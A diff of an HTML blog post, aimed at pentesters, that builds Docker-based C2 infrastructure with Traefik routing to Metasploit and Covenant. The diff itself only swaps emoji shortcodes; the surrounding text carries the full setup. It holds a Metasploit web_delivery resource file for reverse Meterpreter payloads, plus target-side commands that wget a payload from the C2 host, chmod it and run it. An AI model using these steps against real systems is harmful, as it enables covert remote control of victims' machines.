@@ -6,7 +6,7 @@
     
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Abstract Setup :wrench:  Using docker-compose Traefik Metasploit   Running the initial delivery chain :boom:  Monitoring the C2 routing in the Traefik web interface   Covenant C2 Setup :wrench: Running the second delivery chain :boom: Notes  Abstract This blog post&amp;rsquo;s objective is helping pentesters catch up on recent deployment innovations, solving some traditional pain points thanks to container-based infrastructure.
+<meta name="description" content="Abstract Setup 🔧  Using docker-compose Traefik Metasploit   Running the initial delivery chain 💥  Monitoring the C2 routing in the Traefik web interface   Covenant C2 Setup 🔧 Running the second delivery chain 💥 Notes  Abstract This blog post&amp;rsquo;s objective is helping pentesters catch up on recent deployment innovations, solving some traditional pain points thanks to container-based infrastructure.
 These modern infrastructures can seamlessly evolve and scale across hosts, servers and even countries."/>
 <meta name="keywords" content=""/>
 <meta name="robots" content="noodp"/>
@@ -144,26 +144,26 @@ These modern infrastructures can seamlessly evolve and scale across hosts, serve
       
       <ul>
 <li><a href="#abstract">Abstract</a></li>
-<li><a href="#setup-">Setup :wrench:</a>
+<li><a href="#setup-">Setup 🔧</a>
 <ul>
 <li><a href="#using-docker-compose">Using docker-compose</a></li>
 <li><a href="#traefik">Traefik</a></li>
 <li><a href="#metasploit">Metasploit</a></li>
 </ul>
 </li>
-<li><a href="#running-the-initial-delivery-chain-">Running the initial delivery chain :boom:</a>
+<li><a href="#running-the-initial-delivery-chain-">Running the initial delivery chain 💥</a>
 <ul>
 <li><a href="#monitoring-the-c2-routing-in-the-traefik-web-interface">Monitoring the C2 routing in the Traefik web interface</a></li>
 </ul>
 </li>
-<li><a href="#covenant-c2-setup-">Covenant C2 Setup :wrench:</a></li>
-<li><a href="#running-the-second-delivery-chain-">Running the second delivery chain :boom:</a></li>
+<li><a href="#covenant-c2-setup-">Covenant C2 Setup 🔧</a></li>
+<li><a href="#running-the-second-delivery-chain-">Running the second delivery chain 💥</a></li>
 <li><a href="#notes">Notes</a></li>
 </ul>
 <h2 id="abstract">Abstract</h2>
 <p><em>This blog post&rsquo;s objective is <strong>helping pentesters catch up on recent deployment innovations</strong>, solving some traditional pain points thanks to container-based infrastructure.</em></p>
 <p><em>These modern infrastructures can seamlessly <strong>evolve and scale</strong> across hosts, servers and even countries. They can be summoned and deployed in a matter of seconds, <strong>repeatedly</strong>, across the world. They can be continuously changing shape and size, and still <strong>transparently</strong> route traffic however we want.</em> <br>
-<strong><em>We&rsquo;re doing that last part in this blog post</em> :fire:</strong></p>
+<strong><em>We&rsquo;re doing that last part in this blog post</em> 🔥</strong></p>
 <p><em>This kind of infrastructure can do many other things, such as natively load-balancing your handlers, optimizing your implant sessions based on distributed metrics, streamed across your services.</em></p>
 <hr>
 <p><strong>What</strong></p>
@@ -173,9 +173,9 @@ We also want it to be easy to scale, and easy to monitor.</p>
 <p>The traditional method is to use Apache or NGINX, and use <code>Reverse-Proxy</code> static configurations to map our routes.</p>
 <p>In this post, we&rsquo;re going to use <a href="https://github.com/containous/traefik">Traefik v2</a> instead.<br>
 Traefik will enable us to easily manage dynamic routes, and deploy C2 containers with smooth forwarding to our payloads and session handlers.</p>
-<p>:small_orange_diamond: We&rsquo;ll first deploy Traefik routing to our <a href="https://hub.docker.com/r/metasploitframework/metasploit-framework/">Metasploit</a> container, with two different payloads: <code>meterpreter_reverse_ http</code> and <code>meterpreter_reverse_tcp</code>.<br>
-:small_orange_diamond: We&rsquo;ll then run a separate <a href="https://github.com/cobbr/Covenant">Covenant C2</a> container, that will spawn a new route to its web UI, payload and session handler.<br>
-:small_orange_diamond: <strong>We&rsquo;ll first target Linux with Metasploit, then Windows with Covenant.</strong></p>
+<p>🔸 We&rsquo;ll first deploy Traefik routing to our <a href="https://hub.docker.com/r/metasploitframework/metasploit-framework/">Metasploit</a> container, with two different payloads: <code>meterpreter_reverse_ http</code> and <code>meterpreter_reverse_tcp</code>.<br>
+🔸 We&rsquo;ll then run a separate <a href="https://github.com/cobbr/Covenant">Covenant C2</a> container, that will spawn a new route to its web UI, payload and session handler.<br>
+🔸 <strong>We&rsquo;ll first target Linux with Metasploit, then Windows with Covenant.</strong></p>
 <p>Once done, we&rsquo;ll have an elastic reverse-proxy, functional routes to two different C2 containers with payloads and handlers, and the knowledge to summon many more at will. And a nice route monitoring UI.</p>
 <p><a href="/assets/C2/traefik-full-dashboard.png">
   <figure class="center" >
@@ -198,15 +198,15 @@ Traefik will enable us to easily manage dynamic routes, and deploy C2 containers
 <p>This post comes after the <a href="https://khast3x.club/posts/2020-02-09-C2-Protection-Socat-Docker/">Metasploit + Socat post</a>.<br>
 To follow along, having read the previous post will help, as well as having a grasp on Docker networks and volumes.</p>
 <p>We won&rsquo;t be going into HTTPS related configurations for now. But know that Traefik is also very good at that.</p>
-<p><em>To jump to the important parts, look for the small blue diamonds</em> :small_blue_diamond:</p>
+<p><em>To jump to the important parts, look for the small blue diamonds</em> 🔹</p>
 <hr>
-<h2 id="setup-wrench">Setup :wrench:</h2>
+<h2 id="setup-">Setup 🔧</h2>
 <p>This post assumes you&rsquo;ve already installed Docker. If not, <a href="https://docs.docker.com/install/">check out official documentation</a>.<br>
 The ideal setup is running the Docker host on a VPS somewhere in a data center.<br>
 We&rsquo;ll be pulling several containers, be aware that these can be big.</p>
 <p>First, we&rsquo;re going to create a clean working environment.<br>
 Docker supports variables using a <code>.env</code> file, which we&rsquo;ll create right now to make it easier to modify later on.</p>
-<p>:small_blue_diamond: Run the following, replacing &ldquo;YOUR-C2-EXT-IP&rdquo; with your actual Docker host external IP:</p>
+<p>🔹 Run the following, replacing &ldquo;YOUR-C2-EXT-IP&rdquo; with your actual Docker host external IP:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir edgy-c2
 $ cd edgy-c2/
 $ echo <span style="color:#e6db74">&#34;C2EXTIP=YOUR-C2-EXT-IP&#34;</span> &gt; .env
@@ -214,7 +214,7 @@ $ echo <span style="color:#e6db74">&#34;C2EXTIP=YOUR-C2-EXT-IP&#34;</span> &gt; 
 <p>In this post we&rsquo;re going to configure our desired container states in a yaml file, that docker-compose will then figure out and deploy accordingly.</p>
 <p>This makes for much easier, repeatable &ldquo;<em>it always works</em>&rdquo; setups.</p>
 <p>Since it is a binary, you can simply <code>wget</code> it from the <a href="https://github.com/docker/compose/releases/download">official release page</a>. As of writing the version is <code>1.25.3</code>, change to latest version in the URL accordingly.</p>
-<p>:small_blue_diamond: To install docker-compose:</p>
+<p>🔹 To install docker-compose:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo -s <span style="color:#75715e"># If not running as root</span>
 $ curl -L <span style="color:#e6db74">&#34;https://github.com/docker/compose/releases/download/1.25.3/docker-compose-</span><span style="color:#66d9ef">$(</span>uname -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">-</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> -o /usr/local/bin/docker-compose
 $ chmod +x /usr/local/bin/docker-compose
@@ -311,10 +311,10 @@ $ docker-compose --version <span style="color:#75715e"># Check that it is instal
 <p>Finally, we&rsquo;re mounting the Docker socket with read-only permissions so Traefik can stay updated on running containers.</p>
 </li>
 </ul>
-<p>:small_blue_diamond: We&rsquo;re going to create our <code>docker-compose.yml</code> file and start adding Traefik:</p>
+<p>🔹 We&rsquo;re going to create our <code>docker-compose.yml</code> file and start adding Traefik:</p>
 <pre><code>$ nano docker-compose.yml
 </code></pre><!-- raw HTML omitted -->
-<p>:small_blue_diamond: And add the following:</p>
+<p>🔹 And add the following:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">version: <span style="color:#e6db74">&#34;3.7&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
@@ -354,8 +354,8 @@ $ docker-compose --version <span style="color:#75715e"># Check that it is instal
 <p>Since we&rsquo;re deploying using <code>docker-compose</code>, the containers are going to spawn as <em>services</em>. Docker does not like idle services, and will stop the container.</p>
 <p>We&rsquo;re going to mount an additional script that will be executed when the Metasploit container is launched, simply calling <em>sleep</em>.<br>
 In our case, we&rsquo;re sleeping for one day.<br>
-This has the advantage of being potentially used as a self-destruct mechanism for your C2. Glass half-full or half-empty, your call :wine_glass:</p>
-<p>:small_blue_diamond: Run the following:</p>
+This has the advantage of being potentially used as a self-destruct mechanism for your C2. Glass half-full or half-empty, your call 🍷</p>
+<p>🔹 Run the following:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ echo -e <span style="color:#e6db74">&#39;#!/bin/bash\nsleep 1d&#39;</span> &gt; sleep.sh ; chmod +x sleep.sh
 </code></pre></div><p>Our Metasploit resource file will spawn two web_delivery servers:</p>
 <ul>
@@ -364,10 +364,10 @@ This has the advantage of being potentially used as a self-destruct mechanism fo
 </ul>
 <p>We&rsquo;re targeting Linux x64 using two different Meterpreter reverse payloads. If you wish to target something else (Windows, OSX), use <code>show targets</code> and <code>show payloads</code> and set the <code>TARGET</code> and <code>PAYLOAD</code> options accordingly.</p>
 <p>Alternatively, you may also start <code>./msfconsole</code> without any resource file and configure it manually.</p>
-<p>:small_blue_diamond: Open the new resource file:</p>
+<p>🔹 Open the new resource file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nano double_delivery.rc
 </code></pre></div><p>Here are the options to set for Metasploit. You can edit and copy them directly to a resource file that we&rsquo;ll mount to the Metasploit container.</p>
-<p>:small_blue_diamond: Copy the following in the file, replacing YOUR-C2-EXT-IP, save and exit:</p>
+<p>🔹 Copy the following in the file, replacing YOUR-C2-EXT-IP, save and exit:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">use exploit<span style="color:#f92672">/</span>multi<span style="color:#f92672">/</span>script<span style="color:#f92672">/</span>web_delivery
 set LHOST YOUR<span style="color:#f92672">-</span>C2<span style="color:#f92672">-</span>EXT<span style="color:#f92672">-</span>IP
 show targets
@@ -399,9 +399,9 @@ run
 <p>We&rsquo;re also mounting our <code>sleep.sh</code> and <code>double_delivery.rc</code> files, and using the official &ldquo;bleeding-edge&rdquo; Metasploit container.</p>
 </li>
 </ul>
-<p>:small_blue_diamond: Open our previously created docker-compose file:</p>
+<p>🔹 Open our previously created docker-compose file:</p>
 <pre><code>$ nano docker-compose.yml
-</code></pre><p>:small_blue_diamond: And copy the following after the Traefik service we added earlier:</p>
+</code></pre><p>🔹 And copy the following after the Traefik service we added earlier:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#75715e"># ** snip ** </span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Traefik declaration block above</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Note that the msf block is indented</span><span style="color:#960050;background-color:#1e0010">
@@ -436,21 +436,21 @@ run
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.services.msfHandlerTcp.loadbalancer.server.port=4445&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.msfHandlerTcp.entrypoints=tcp-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span></code></pre></div><hr>
-<h2 id="running-the-initial-delivery-chain-boom">Running the initial delivery chain :boom:</h2>
+<h2 id="running-the-initial-delivery-chain-">Running the initial delivery chain 💥</h2>
 <p>The <code>docker-compose.yml</code> file should now be ready for our first run. Double check you&rsquo;re in the directory with the docker-compose yaml file.</p>
-<p>:small_blue_diamond: To start the stack, run:</p>
+<p>🔹 To start the stack, run:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker-compose up
 </code></pre></div><p>Run the stack in the foreground to view the Traefik logs. Use <code>-d</code> to run the stack as a daemon.</p>
 <p>You can stop the running stack by hitting CTRL+C.<br>
 If that fails for some reason, you can run <code>docker-compose down</code>.</p>
-<p>:small_blue_diamond: In another shell on your Docker host, run:</p>
+<p>🔹 In another shell on your Docker host, run:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker exec -it msf /bin/bash
 bash-5.0&gt; ./msfconsole -r double_delivery.rc
 </code></pre></div><p>You should now have a shell to your C2, with both delivery servers and associated handlers running.</p>
 <p>In the output, you&rsquo;ll see the useful command to run directly on your target, that will fetch and execute the Meterpreter payload.<br>
 In our case, you should see both the reverse_http and reverse_tcp commands, fetched using <code>wget</code>.</p>
 <p><strong>We&rsquo;re going to change that final command to run on the target,</strong> remove the SRVPORT from the final URL.</p>
-<p>:small_blue_diamond: On the target machine, run:</p>
+<p>🔹 On the target machine, run:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$  wget -qO httpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_http; chmod +x httpPayload; ./httpPayload&amp;
 $  wget -qO tcpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_tcp; chmod +x tcpPayload; ./tcpPayload&amp;
 </code></pre></div><p>You should now see your payloads calling home through Traefik.</p>
@@ -467,14 +467,14 @@ $  wget -qO tcpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_tcp
 Your host might need to match the targeted architecture.</em></p>
 <h3 id="monitoring-the-c2-routing-in-the-traefik-web-interface">Monitoring the C2 routing in the Traefik web interface</h3>
 <p>If you recall earlier, we activated Traefik&rsquo;s Web UI, with a route and a simple authentication using <code>test:test</code>.</p>
-<p>:small_blue_diamond: Head to <code>http://YOUR-C2-EXT-IP/dashboard/#</code> to monitor all the live routes.</p>
+<p>🔹 Head to <code>http://YOUR-C2-EXT-IP/dashboard/#</code> to monitor all the live routes.</p>
 <hr>
-<h2 id="covenant-c2-setup-wrench">Covenant C2 Setup :wrench:</h2>
+<h2 id="covenant-c2-setup-">Covenant C2 Setup 🔧</h2>
 <p>Now that we&rsquo;ve successfully deployed our stack, let&rsquo;s deploy our second C2.<br>
 To demonstrate Traefik&rsquo;s dynamic routing, we&rsquo;re going to build and deploy <a href="https://github.com/cobbr/Covenant">Covenant</a> as a container.</p>
 <p>Let&rsquo;s first build the Covenant container. Unlike the Metasploit container, there is no official &ldquo;ready-made&rdquo; built container available on Docker Hub, so we&rsquo;ll build it ourselves.</p>
 <p>Make sure you use a recursive clone, as it uses submodules.</p>
-<p>:small_blue_diamond: Still in the <code>edgy-c2/</code> working directory, run:</p>
+<p>🔹 Still in the <code>edgy-c2/</code> working directory, run:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ git clone --recurse-submodules https://github.com/cobbr/Covenant
 $ docker build -t covenant Covenant/Covenant <span style="color:#75715e"># Give it a few minutes</span>
 </code></pre></div><p>(<a href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup">source</a>)</p>
@@ -490,9 +490,9 @@ That is why the <code>tls-ep</code> entry point is currently configured as a TCP
 <li><code>web-ep/cov_handler</code> will route to Covenant&rsquo;s payload handler.</li>
 </ul>
 <p>Finally, we&rsquo;re asking Docker to hook the spawned service to the <code>edgy-c2_default</code> network generated by our previous docker-compose execution.</p>
-<p>:small_blue_diamond: Open a new docker-compose file dedicated to Covenant:</p>
+<p>🔹 Open a new docker-compose file dedicated to Covenant:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nano covenant-docker-compose.yml
-</code></pre></div><p>:small_blue_diamond: Copy the following, save and exit:</p>
+</code></pre></div><p>🔹 Copy the following, save and exit:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">version: <span style="color:#e6db74">&#34;3.7&#34;</span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
@@ -521,13 +521,13 @@ That is why the <code>tls-ep</code> entry point is currently configured as a TCP
 </span><span style="color:#960050;background-color:#1e0010"></span>  default:<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>    external:<span style="color:#960050;background-color:#1e0010">
 </span><span style="color:#960050;background-color:#1e0010"></span>      name: edgy-c2_default<span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>:small_blue_diamond: Start our new service using:</p>
+</span></code></pre></div><p>🔹 Start our new service using:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker-compose -f covenant-docker-compose.yml up
 </code></pre></div><p>You should see Traefik&rsquo;s logs picking up the new service. You can also check out your new routes and services by refreshing the Traefik web interface.</p>
 <hr>
-<h2 id="running-the-second-delivery-chain-boom">Running the second delivery chain :boom:</h2>
+<h2 id="running-the-second-delivery-chain-">Running the second delivery chain 💥</h2>
 <p>Head over to Covenant&rsquo;s web interface, located at <code>https://YOUR-C2-EXTERNAL-IP/</code>. Accept the unsigned certificate, fill out the username and password for the admin account.</p>
-<p>:small_blue_diamond: Here&rsquo;s the configuration summary if you want to breeze through the interface:</p>
+<p>🔹 Here&rsquo;s the configuration summary if you want to breeze through the interface:</p>
 <ul>
 <li>New <strong>Listener profile</strong>: add our routed payload session URI</li>
 <li>New <strong>Listener</strong> with custom profile</li>
@@ -536,7 +536,7 @@ That is why the <code>tls-ep</code> entry point is currently configured as a TCP
 <li>Fetch payload on target using routed delivery URI</li>
 <li>Execute</li>
 </ul>
-<p>:small_blue_diamond: Here are the detailed steps:</p>
+<p>🔹 Here are the detailed steps:</p>
 <ol>
 <li><strong>Create a new Listener profile.</strong></li>
 </ol>
@@ -653,18 +653,18 @@ That is why the <code>tls-ep</code> entry point is currently configured as a TCP
 </a></p>
 <p>You should now see your Grunt calling back home through the route we configured, and available to interact within the Grunts menu.<br>
 Use CTRL+C or <code>docker-compose -f covenant-docker-compose.yml down</code> to stop the Covenant C2.</p>
-<p>:star: :tada: <strong>Well done! You now have a fully functional elastic C2 infrastructure!</strong> :tada: :star:</p>
+<p>⭐ 🎉 <strong>Well done! You now have a fully functional elastic C2 infrastructure!</strong> 🎉 ⭐</p>
 <p>Now&rsquo;s the time to take a break, you&rsquo;ve earned it.<br>
 Take a minute to contemplate your success, and the new paths you have opened to your upcoming adventures.</p>
 <p><img src="https://media.giphy.com/media/IbmVEYuOKVgvDndnf7/giphy.gif" alt=""></p>
-<p>:shell: :yellow_heart: :skull: :green_heart: :shell: :blue_heart: :skull: :purple_heart: :shell:</p>
+<p>🐚 💛 💀 💚 🐚 💙 💀 💜 🐚</p>
 <p><em>I hope you had a good time.</em><br>
 <em>If you enjoyed this post, you can <a href="todo">follow me on Twitter</a> to stay updated.</em><br>
 <em>Cheers!</em></p>
 <p><em>k</em></p>
-<p>:shell: :yellow_heart: :skull: :green_heart: :shell: :blue_heart: :skull: :purple_heart: :shell:</p>
+<p>🐚 💛 💀 💚 🐚 💙 💀 💜 🐚</p>
 <h2 id="notes">Notes</h2>
-<p>Related subjects we have not covered in this post, for those who want to go further down the rabbit-hole :rabbit::</p>
+<p>Related subjects we have not covered in this post, for those who want to go further down the rabbit-hole 🐰:</p>
 <ul>
 <li>Using HTTPS with handlers and web interfaces behind Traefik</li>
 <li>Using Let&rsquo;s Encrypt automation</li>
